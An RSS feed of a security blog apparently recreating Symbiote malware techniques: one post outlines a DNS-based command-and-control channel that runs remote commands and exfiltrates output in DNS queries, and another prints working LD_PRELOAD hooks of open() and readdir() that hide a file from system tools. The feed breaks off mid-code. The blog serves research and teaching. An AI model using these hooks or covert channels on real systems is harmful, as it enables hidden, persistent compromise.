<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>archive://syrull</title><link>https://sy1.sh/</link><description>archive://syrull</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 26 Oct 2022 20:45:03 +0300</lastBuildDate><atom:link href="https://sy1.sh/index.xml" rel="self" type="application/rss+xml"/><item><title>Using DNS as C2 Communication - Evasive Techniques (Part 3)</title><link>https://sy1.sh/posts/dns-c2-communcation/</link><pubDate>Wed, 26 Oct 2022 20:45:03 +0300</pubDate><guid>https://sy1.sh/posts/dns-c2-communcation/</guid><description>&lt;h2 id="series" >Series
&lt;span>
&lt;a href="#series">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>&lt;a href="https://sy1.sh/posts/dynamic-linker-hijacking-experiments/">Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/">Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)&lt;/a>&lt;/li>
&lt;li>(this one)&lt;/li>
&lt;/ol>
&lt;h2 id="overview" >Overview
&lt;span>
&lt;a href="#overview">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Following my last post about some evasion techniques that the &lt;a href="https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat">Symbiote&lt;/a> uses which I tried to recreate in their simplest form, this post will see how the Symbiote is communicating to the command and control &lt;a href="https://www.malwarepatrol.net/command-control-servers-c2-servers-fundamentals/">C2&lt;/a> server.&lt;/p>
&lt;p>Upon reading the article, we can see that the Symbiote uses the DNS Protocol to exfiltrate data out of the infected machine, the way that it does that is by chunking it into a bunch of &lt;a href="https://www.cloudflare.com/learning/dns/dns-records/dns-a-record/">A&lt;/a> Resource Records (RR) that it sends through the UDP. The &lt;code>A&lt;/code> Record looks like this:&lt;/p>
&lt;pre tabindex="0">&lt;code>{PACKET_NUMBER}.{MACHINE_ID}.{HEX_ENCODED_PAYLOAD}.{DOMAIN_NAME}
&lt;/code>&lt;/pre>&lt;p>I will deliberately skip the whole authentication process that the malware uses, since it gets out of the scope of the post.&lt;/p>
&lt;h2 id="why-dns-and-not-arbitrary-protocol" >Why DNS and not {arbitrary protocol}?
&lt;span>
&lt;a href="#why-dns-and-not-arbitrary-protocol">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>DNS is being used in order to avoid/bypass the firewall rules and in some special scenarios that no TCP outgoing communication is possible.&lt;/p>
&lt;p>&lt;a href="https://resources.infosecinstitute.com/topic/bypassing-security-products-via-dns-data-exfiltration/">Bypassing security products via DNS data exfiltration&lt;/a>&lt;/p>
&lt;h2 id="implementation" >Implementation
&lt;span>
&lt;a href="#implementation">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>I will explain it briefly from the agent&amp;rsquo;s point of view. We are sending the C2 server a beam (in a shape of a DNS request) every n seconds to check if there is a command for us to execute if we receive a non empty Answer with a &lt;code>TXT&lt;/code> Record (containing a command such as &lt;code>ls&lt;/code>) we execute that command and after we have the output of the command, we exfiltrate it back to the C2 Server. This happens by sending multiple DNS A record questions (chunks) back to the server. I used the same format that the Symbiote uses for the records.&lt;/p>
&lt;p>Note: Each element of a domain name can contain up to 63 chars of information, a full domain name can contain 253 chars. &lt;a href="https://stackoverflow.com/a/28918017">More info&lt;/a>&lt;/p>
&lt;p>After the server receives a request with the packet number and the total number of packets (that&amp;rsquo;s the first part of the message) it starts building the output message that we will see after we receive all the packets (through the &lt;code>{HEX_ENCODED_PAYLOAD}&lt;/code> part of the message).&lt;/p>
&lt;h2 id="code--demo" >Code / Demo
&lt;span>
&lt;a href="#code--demo">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>&lt;a href="https://github.com/syrull/dnsc2">Repository&lt;/a> - The repository is created for a starting point to improve/build upon.&lt;/p>
&lt;p>&lt;img src="https://sy1.sh/dnsc2/demo.gif" alt="DNSC2Demo">&lt;/p>
&lt;p>The repository contains both the agent and the server. When the server is being ran it sets the default handler &lt;code>dns.HandleFunc(&amp;quot;.&amp;quot;, AgentHandler)&lt;/code> to handle any pattern for domain question this is for convenience, in some other cases you will want to specify some special handles.&lt;/p>
&lt;h3 id="usage" >Usage
&lt;span>
&lt;a href="#usage">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h3>&lt;ol>
&lt;li>Start the server
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ go run main.go 127.0.0.1:8053
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Start the agent
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ go run ./agent/main.go
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Execute commands on the server side shell (In the case below simple &lt;code>dir&lt;/code>). Note that I type &lt;code>cmd /C dir&lt;/code> - &lt;a href="https://superuser.com/a/1246360">Why?&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;lt;&lt;span style="color:#f92672">((((&lt;/span>&amp;gt; dns c2 by syl &amp;lt;&lt;span style="color:#f92672">))))&lt;/span>&amp;gt;&amp;lt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>dnsc2&amp;gt; cmd /C dir
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volume in drive C is OS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volume Serial Number is XXXX-XXXX
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>Directory of C:\code\dnsc2\agent
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>10/28/2022 08:40 PM &amp;lt;DIR&amp;gt; .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10/29/2022 11:03 PM &amp;lt;DIR&amp;gt; ..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10/28/2022 08:40 PM 481 go.mod
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10/28/2022 08:40 PM 3,755 go.sum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10/30/2022 12:37 PM 1,762 main.go
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 3 File(s) 5,998 bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 2 Dir(s) 107,561,959,424 bytes free
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="conclusion" >Conclusion
&lt;span>
&lt;a href="#conclusion">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Please note that there could be some easier ways to do this, and some information can be wrong I did my best to research everything that I post here, if you find an error or if you think that something can be improved somewhere you can drop me a message!&lt;/p>
&lt;h1 id="resources" >Resources
&lt;span>
&lt;a href="#resources">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;ul>
&lt;li>&lt;a href="https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat">https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://stackoverflow.com/a/28918017">https://stackoverflow.com/a/28918017&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.cloudflare.com/learning/dns/what-is-dns/">https://www.cloudflare.com/learning/dns/what-is-dns/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://resources.infosecinstitute.com/topic/bypassing-security-products-via-dns-data-exfiltration/">https://resources.infosecinstitute.com/topic/bypassing-security-products-via-dns-data-exfiltration/&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)</title><link>https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/</link><pubDate>Tue, 04 Oct 2022 21:45:03 +0300</pubDate><guid>https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/</guid><description>&lt;h2 id="series" >Series
&lt;span>
&lt;a href="#series">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>&lt;a href="https://sy1.sh/posts/dynamic-linker-hijacking-experiments/">Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)&lt;/a>&lt;/li>
&lt;li>(this one)&lt;/li>
&lt;li>&lt;a href="https://sy1.sh/posts/dns-c2-communcation/">Using DNS as C2 Communication - Evasive Techniques (Part 3)&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="journey-post" >Journey Post
&lt;span>
&lt;a href="#journey-post">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>This post is a something that I call &amp;ldquo;journey post&amp;rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like &lt;code>&amp;lt;journey&amp;gt;&lt;/code> so that you can skip it if you are in a hurry.&lt;/p>
&lt;hr />
&lt;h2 id="overview" >Overview
&lt;span>
&lt;a href="#overview">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>In the last post I&amp;rsquo;ve described how I hid a file from all the sys calls that are using &lt;code>readdir&lt;/code>. In this post I will try to hide it from the &lt;code>cat&lt;/code> command. Let&amp;rsquo;s first examine/reverse engineer how the &lt;code>cat&lt;/code> command works internally.&lt;/p>
&lt;p>Naturally I would start with a simple &lt;a href="https://man7.org/linux/man-pages/man1/strace.1.html">strace&lt;/a> which will trace the system calls and signals that the command uses.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ which cat
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/cat
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ strace /usr/bin/cat syl.lys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>execve(&amp;#34;/usr/bin/cat&amp;#34;, [&amp;#34;/usr/bin/cat&amp;#34;, &amp;#34;syl.lys&amp;#34;], 0x7ffca9c17508 /* 68 vars */) = 0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>access(&amp;#34;/etc/ld.so.preload&amp;#34;, R_OK) = -1 ENOENT (No such file or directory) // WINK WINK, not yet
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>openat(AT_FDCWD, &amp;#34;syl.lys&amp;#34;, O_RDONLY) = 3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The most interesting sys call in the output is &lt;code>openat&lt;/code> so lets see the source code of &lt;a href="https://github.com/coreutils/gnulib/blob/master/lib/openat.c#L182">openat.c&lt;/a>. Here we can see the &lt;code>char const *file&lt;/code> that variable is what holds our filename (look at the &lt;code>strace&lt;/code> output). After that, I followed our steps in the last &lt;a href="dynamic-linker-hijacking-experiments">post&lt;/a> by implementing a function with the same signature and wrapping the original one.&lt;/p>
&lt;p>&lt;code>&amp;lt;journey&amp;gt;&lt;/code>&lt;/p>
&lt;p>After a few tries I was quick to realize that there is some issue. The wrapper that I&amp;rsquo;ve implemented didn&amp;rsquo;t work, or at least didn&amp;rsquo;t work all the time. I&amp;rsquo;ve tested it out with a simple program that would just call it and in there it worked, I didn&amp;rsquo;t quite get why it does what it does but I found the following discussions:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://stackoverflow.com/questions/9161116/intercepting-the-openat-system-call-for-gnu-tar">intercepting the openat() system call for GNU tar&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://stackoverflow.com/questions/49314057/how-to-find-out-what-functions-to-intercept-with-ld-preload">How to find out what functions to intercept with LD_PRELOAD?&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>As it turns out (my best guess) the sys call that I am trying to override &lt;code>openat&lt;/code> is probably not the one that the &lt;code>cat&lt;/code> uses. I decided to look at the source code for [cat.c][https://github.com/coreutils/coreutils/blob/master/src/cat.c] and search for everything that has &lt;code>*open*&lt;/code> in it.&lt;/p>
&lt;p>I found on &lt;a href="https://github.com/coreutils/coreutils/blob/master/src/cat.c#L686">line 686&lt;/a> a call to the &lt;code>open&lt;/code>. An important note here is that this &lt;code>open&lt;/code> call here is not the sys call but the call in the std lib which will call the related system call for us. So I&amp;rsquo;ve decided to change my approach and override the &lt;code>open&lt;/code> function instead.&lt;/p>
&lt;p>&lt;code>&amp;lt;/journey&amp;gt;&lt;/code>&lt;/p>
&lt;p>How does the &lt;a href="https://man7.org/linux/man-pages/man2/open.2.html">open function&lt;/a> work? I wouldn&amp;rsquo;t try to explain something that I am hardly good at so it is best for you to read the man pages for that one.&lt;/p>
&lt;p>Let&amp;rsquo;s start by copying the signature of the &lt;a href="https://github.com/coreutils/gnulib/blob/master/lib/open.c#L59">open function&lt;/a> and wrap it.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#a6e22e">int&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>original_open)(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">int&lt;/span> flags, ...) &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">int&lt;/span> flags, ...)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> original_open(filename, flags);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this code block I&amp;rsquo;ve wrapped the original &lt;code>open&lt;/code> function with our implementation of the &lt;code>open&lt;/code> function. What is left now is to add our &amp;ldquo;malicious&amp;rdquo; part to it.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> ENOENT; &lt;span style="color:#75715e">// Setting up the error to be ERROR NO ENTRY(ENOENT)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>; &lt;span style="color:#75715e">// Returning -1 (failure)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And lastly all together&lt;/p>
&lt;p>&lt;a href="https://github.com/syrull/evasive_techniques/blob/main/Part_2_open/intercept_open.c">intercept_open.c&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;dlfcn.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;errno.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define MALICIOUS_FILE &amp;#34;syl.lys&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#a6e22e">int&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>original_open)(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">int&lt;/span> flags, ...) &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">int&lt;/span> flags, ...)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (strcmp(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> ENOENT;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> original_open(filename, flags);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s see if its working&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>intercept_open.so syl.lys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ LD_PRELOAD&lt;span style="color:#f92672">=&lt;/span>./intercept_open.so cat syl.lys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat: syl.lys: No such file or directory
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As you can see the &lt;code>cat&lt;/code> command returns &lt;code>No such file or directory&lt;/code> which is exactly what we are aiming for.&lt;/p>
&lt;h2 id="combining-it-with-our-readdir" >Combining it with our &lt;code>readdir&lt;/code>
&lt;span>
&lt;a href="#combining-it-with-our-readdir">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>We created a malicious &lt;code>open&lt;/code> function that wraps the original one from the standard lib, lets now combine it with the &lt;code>readdir&lt;/code> from the previous post into a single shared object.&lt;/p>
&lt;p>&lt;a href="https://github.com/syrull/evasive_techniques/blob/main/Part_2_open/malicious.c">malicious.c&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;dlfcn.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
